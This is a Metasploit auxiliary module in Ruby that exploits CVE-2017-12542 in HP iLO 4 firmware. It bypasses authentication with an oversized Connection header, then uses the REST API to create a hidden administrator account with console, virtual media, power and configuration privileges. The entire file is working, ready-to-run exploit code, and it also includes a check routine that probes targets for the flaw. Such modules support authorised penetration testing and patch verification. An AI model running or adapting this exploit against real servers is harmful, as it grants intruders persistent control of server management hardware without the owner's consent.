##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP iLO 4 1.00-2.50 Authentication Bypass Administrator Account Creation',
      'Description'    => %q{
        This module exploits an authentication bypass in HP iLO 4 1.00 to 2.50, triggered by a buffer
        overflow in the Connection HTTP header handling by the web server.
        Exploiting this vulnerability gives full access to the REST API, allowing arbitrary
        accounts creation.
      },
      'References'     =>
        [
          [ 'CVE', '2017-12542' ],
          [ 'BID', '100467' ],
          [ 'URL', 'https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03769en_us' ],
          [ 'URL', 'https://www.synacktiv.com/posts/exploit/hp-ilo-talk-at-recon-brx-2018.html' ]
        ],
      'Author'         =>
        [
          'Fabien Perigaud <fabien[dot]perigaud[at]synacktiv[dot]com>'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Aug 24 2017",
      'DefaultOptions' => { 'SSL' => true }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [true, 'Username for the new account', Rex::Text.rand_text_alphanumeric(8)]),
        OptString.new('PASSWORD', [true, 'Password for the new account', Rex::Text.rand_text_alphanumeric(12)])
      ])
  end

  def check
    begin
      res = send_request_cgi({
                             'method' => 'GET',
                             'uri'    => '/rest/v1/AccountService/Accounts',
                             'headers' => {
                               "Connection" => Rex::Text.rand_text_alphanumeric(29)
                             }
                             })
    rescue
      return Exploit::CheckCode::Unknown
    end

    if res.code == 200 and res.body.include? '"Description":"iLO User Accounts"'
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def run
    print_status("Trying to create account #{datastore["USERNAME"]}...")

    data = {}
    data["UserName"] = datastore["USERNAME"]
    data["Password"] = datastore["PASSWORD"]
    data["Oem"] = {}
    data["Oem"]["Hp"] = {}
    data["Oem"]["Hp"]["LoginName"] = datastore["USERNAME"]
    data["Oem"]["Hp"]["Privileges"] = {}
    data["Oem"]["Hp"]["Privileges"]["LoginPriv"] = true
    data["Oem"]["Hp"]["Privileges"]["RemoteConsolePriv"] = true
    data["Oem"]["Hp"]["Privileges"]["UserConfigPriv"] = true
    data["Oem"]["Hp"]["Privileges"]["VirtualMediaPriv"] = true
    data["Oem"]["Hp"]["Privileges"]["VirtualPowerAndResetPriv"] = true
    data["Oem"]["Hp"]["Privileges"]["iLOConfigPriv"] = true

    begin
      res = send_request_cgi({
                               'method' => 'POST',
                               'uri'    => '/rest/v1/AccountService/Accounts',
                               'ctype'  => 'application/json',
                               'headers' => {
                                 "Connection" => Rex::Text.rand_text_alphanumeric(29)
                               },
                               'data' => data.to_json()
                             })
    rescue Rex::ConnectionRefused
    end

    unless res
      fail_with(Failure::Unknown, 'Connection failed')
    end

    if res.body.include? 'InvalidPasswordLength'
      fail_with(Failure::BadConfig, "Password #{datastore["PASSWORD"]} is too short.")
    end

    if res.body.include? 'UserAlreadyExist'
      fail_with(Failure::BadConfig, "Unable to add login #{datastore["USERNAME"]}, user already exists")
    end

    unless res.code == 201
      fail_with(Failure::UnexpectedReply, "Unknown error while creating the user. Response: #{res.code}")
    end

    print_good("Account #{datastore["USERNAME"]}/#{datastore["PASSWORD"]} created successfully.")
  end
end

